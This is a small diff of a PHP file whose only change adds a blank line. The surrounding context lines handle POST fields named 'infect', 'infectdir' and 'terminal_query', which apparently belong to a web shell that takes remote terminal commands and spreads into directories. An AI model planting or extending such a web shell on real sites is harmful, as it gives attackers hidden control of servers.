@@ -75,6 +75,7 @@ if(isset($_POST['infect']) && $_POST['infect'] != '' && isset($_POST['infectdir'
     die();
 }
 
+
 if(isset($_POST['terminal_query']) && $_POST['terminal_query'] != ''){
     if(stristr($_POST['terminal_query'],':help')){
         echo '<table style="width:100%">
